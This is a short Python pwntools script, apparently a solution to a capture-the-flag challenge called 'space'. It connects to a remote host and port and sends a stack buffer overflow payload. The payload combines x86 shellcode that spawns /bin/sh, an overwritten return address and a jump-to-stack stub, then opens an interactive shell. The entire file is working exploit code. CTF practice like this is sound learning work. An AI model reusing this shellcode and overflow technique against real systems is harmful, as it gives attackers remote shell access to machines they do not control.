#!usr/bin/env/python
from pwn import *


# p = process("./space")

p = remote("167.99.82.136",32595)
# shell = shellcraft.sh()
# print(shell)
# print(hexdump(asm(shell)))

first_shellcode = b"\x31\xd2\x31\xc0\x83\xec\x16\xff\xe4"

last_shellcode = b"\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"



buf = b"\x90" + last_shellcode + p32(0x804919f) + first_shellcode

with open("payload", "wb") as file:
	file.write(buf)

# g = gdb.attach(p,gdbscript="""b *0x804919f""")

p.sendlineafter("> ",buf)
p.interactive()